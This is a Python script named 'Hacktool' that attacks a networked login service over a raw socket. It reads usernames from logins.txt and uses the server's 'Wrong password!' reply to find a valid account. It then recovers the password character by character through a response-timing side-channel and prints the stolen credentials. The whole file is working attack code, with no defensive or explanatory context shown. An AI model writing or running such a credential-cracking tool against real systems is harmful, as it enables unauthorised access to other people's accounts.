import socket
import argparse
from string import digits, ascii_lowercase
import itertools
import json
import time


class Hacktool:

    def __init__(self, data):
        self.hostname = data[0]
        self.port = int(data[1])
        self.login = None
        self.password = ''
        self.address = (self.hostname, self.port)
        self.my_socket = None
        self.recv_data = None
        self.psw_base = []
        self.abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

    def connect_to_socket(self):
        self.my_socket = socket.socket()
        self.my_socket.connect(self.address)

    def send_data(self, log_pasw):
        mes = log_pasw.encode()
        self.my_socket.send(mes)

    def receive(self):
        response = self.my_socket.recv(1024)
        js_recieved = response.decode()
        self.recv_data = json.loads(js_recieved)

    def close(self):
        self.my_socket.close()

    def gen_password(self):
        data = ascii_lowercase + digits
        for n in range(1, 4):
            n_step = itertools.product(data, repeat=n)
            yield n_step

    def lower_upper_words(self):
        with open("passwords.txt", "r") as file:
            for line in file:
                lower_upper = [[letter.lower(), letter.upper()] for letter in line.strip()]
                my_gen = itertools.product(*lower_upper)
                for item in my_gen:
                    yield ''.join(item)

    def read_log_file(self):
        with open("logins.txt", "r") as login_file:
            for line in login_file:
                js_data = json.dumps({"login": f"{line.strip()}", "password": f"{''}"})
                yield js_data

    def get_fit_login(self):
        my_gen = self.read_log_file()
        while True:
            login = next(my_gen)
            # word = next(words)
            self.send_data(login)
            self.receive()
            if self.recv_data['result'] == "Wrong password!":
                self.login = json.loads(login)['login']
                break

    def get_fit_pass(self):
        for letter in self.abc:
            self.psw_base.append(str(letter))
            psw = ''.join(self.psw_base)
            js_data = json.dumps({"login": f"{self.login}", "password": f"{psw}"})
            self.send_data(js_data)
            start = time.perf_counter()
            self.receive()
            stop = time.perf_counter()
            delta = stop - start
            # print('Time: ', delta)
            if self.recv_data['result'] == "Connection success!":
                self.password = psw
                return True
            if delta >= 0.09:
                return False
            elif delta < 0.09:
                self.psw_base.pop()
                continue


"""Parse command line arguments"""
parser = argparse.ArgumentParser()
parser.add_argument("hostname", default='localhost')
parser.add_argument("port", default=9090)
# parser.add_argument("password", default=None)
args = parser.parse_args()
params = [args.hostname, args.port]


def main():
    my_hacktool = Hacktool(params)
    my_hacktool.connect_to_socket()
    # words = my_hacktool.lower_upper_words()
    my_hacktool.get_fit_login()
    while True:
        if my_hacktool.get_fit_pass():
            break
    print(json.dumps({"login": f"{my_hacktool.login}", "password": f"{my_hacktool.password}"}))
    my_hacktool.close()


if __name__ == "__main__":
    main()
